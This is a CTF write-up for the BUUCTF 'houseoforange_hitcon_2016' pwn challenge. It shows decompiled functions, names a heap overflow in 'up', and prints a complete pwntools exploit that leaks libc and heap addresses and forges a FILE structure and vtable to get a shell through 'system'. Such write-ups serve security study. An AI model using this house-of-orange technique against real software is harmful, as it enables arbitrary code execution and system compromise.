# BUU-houseoforange_hitcon_2016

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

## IDA

**add**

```c
int add()
{
  unsigned int size; // [rsp+8h] [rbp-18h]
  int size_4; // [rsp+Ch] [rbp-14h]
  _QWORD *v3; // [rsp+10h] [rbp-10h]
  _DWORD *v4; // [rsp+18h] [rbp-8h]

  if ( add_count > 3u )
  {
    puts("Too many house");
    exit(1);
  }
  v3 = malloc(0x10uLL);
  printf("Length of name :");
  size = read_num();
  if ( size > 0x1000 )
    size = 0x1000;
  v3[1] = malloc(size);
  if ( !v3[1] )
  {
    puts("Malloc error !!!");
    exit(1);
  }
  printf("Name :");
  read_data(v3[1], size);
  v4 = calloc(1uLL, 8uLL);
  printf("Price of Orange:");
  *v4 = read_num();
  color_list();
  printf("Color of Orange:");
  size_4 = read_num();
  if ( size_4 != 56746 && (size_4 <= 0 || size_4 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( size_4 == 56746 )
    v4[1] = 56746;
  else
    v4[1] = size_4 + 30;
  *v3 = v4;
  color = v3;
  ++add_count;
  return puts("Finish");
}
```

**up**

```c
int up()
{
  _DWORD *v1; // rbx
  unsigned int v2; // [rsp+8h] [rbp-18h]
  int v3; // [rsp+Ch] [rbp-14h]

  if ( up_counter > 2u )
    return puts("You can't upgrade more");
  if ( !color )
    return puts("No such house !");
  printf("Length of name :");
  v2 = read_num();
  if ( v2 > 0x1000 )
    v2 = 4096;
  printf("Name:");
  read_data(color[1], v2);
  printf("Price of Orange: ");
  v1 = (_DWORD *)*color;
  *v1 = read_num();
  color_list();
  printf("Color of Orange: ");
  v3 = read_num();
  if ( v3 != 56746 && (v3 <= 0 || v3 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( v3 == 56746 )
    *(_DWORD *)(*color + 4LL) = 56746;
  else
    *(_DWORD *)(*color + 4LL) = v3 + 30;
  ++up_counter;
  return puts("Finish");
}
```

**see**

```c
int see()
{
  int v0; // eax
  int result; // eax
  int v2; // eax

  if ( !color )
    return puts("No such house !");
  if ( *(_DWORD *)(*color + 4LL) == 56746 )
  {
    printf("Name of house : %s\n", (const char *)color[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*color);
    v0 = rand();
    result = printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&unk_203080 + v0 % 8));
  }
  else
  {
    if ( *(int *)(*color + 4LL) <= 30 || *(int *)(*color + 4LL) > 37 )
    {
      puts("Color corruption!");
      exit(1);
    }
    printf("Name of house : %s\n", (const char *)color[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*color);
    v2 = rand();
    result = printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*color + 4LL), *((const char **)&unk_203080 + v2 % 8));
  }
  return result;
}
```

漏洞点为：在`up`中有溢出。

如题，使用`house_of_orange`，本质上`house_of_orange`中使用了`unsortedbin attack`将伪造的`fake FILE`链入`_IO_list_all`中，实现控制程序执行流。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"

local=0
binary='./houseoforange_hitcon_2016'
#gdb.attach(sh)
if local:
	#context.log_level="DEBUG"
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27919)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.27.so',checksec=False)
vtable_offset=0xd8
_IO_write_base=0x20
_IO_write_ptr=0x28


def add(length, name, price, color):
    sh.recvuntil('choice : ')
    sh.sendline('1')
    sh.sendlineafter('Length of name :', str(length))
    sh.sendafter('Name :', str(name))
    sh.sendafter('Price of Orange:', str(price))
    sh.sendafter('Color of Orange:', str(color))

def see():
    sh.recvuntil('choice : ')
    sh.sendline('2')

def up(length, name, price, color):
    sh.recvuntil('choice : ')
    sh.sendline('3')
    sh.sendlineafter('Length of name :', str(length))
    sh.sendafter('Name:', str(name))
    sh.sendafter('Price of Orange:', str(price))
    sh.sendafter('Color of Orange:', str(color))
#get a free chunk
add(0x80,'a'*8,111,0xddaa)

up(0x450,'\x00'*0x80+p64(0)+p64(0x21)+'\x00'*0x10+p64(0)+p64(0xf31),222,0xddaa)
add(0x1000,'c'*8,333,0xddaa)
add(0x400,'a'*8,444,0xddaa)
#fake vtable
#gdb.attach(sh)
see()

main_arena=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
malloc_hook = main_arena-1640-0x10
libc = LibcSearcher('__malloc_hook',malloc_hook)
libcbase = malloc_hook-libc.dump('__malloc_hook')
leak('main hook',malloc_hook)
leak('libc base',libcbase)
IO_list_all = libcbase +libc.dump('_IO_list_all')
system=libcbase+libc.dump('system')
leak('IO_list_all',IO_list_all)

up(0x400,'a'*0x10,666,0xddaa)
see()
heapbase = u64(sh.recvuntil('\x56')[-6:].ljust(8,'\x00'))
leak('heap base',heapbase)
vtable=heapbase+0x400+0x20+0x100-0x10

payload = '\x00'*0x408+p64(0x21)+'\x00'*0x10
payload+='/bin/sh\x00'+p64(0x61)
payload+=p64(main_arena)+p64(IO_list_all-0x10)
payload+=p64(0x2)+p64(0x3)+p64(0)*21
payload+=p64(vtable)+p64(0)*3+p64(system)
up(0x1000,payload,666,0xddaa)
#get shell
#gdb.attach(sh)
sh.recvuntil('choice : ')
sh.sendline('1')

sh.interactive()
```

offset

```c
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```

```c
void * funcs[] = {
   1 NULL, // "extra word"
   2 NULL, // DUMMY
   3 exit, // finish
   4 NULL, // overflow
   5 NULL, // underflow
   6 NULL, // uflow
   7 NULL, // pbackfail

   8 NULL, // xsputn  #printf
   9 NULL, // xsgetn
   10 NULL, // seekoff
   11 NULL, // seekpos
   12 NULL, // setbuf
   13 NULL, // sync
   14 NULL, // doallocate
   15 NULL, // read
   16 NULL, // write
   17 NULL, // seek
   18 pwn,  // close
   19 NULL, // stat
   20 NULL, // showmanyc
   21 NULL, // imbue
};
```

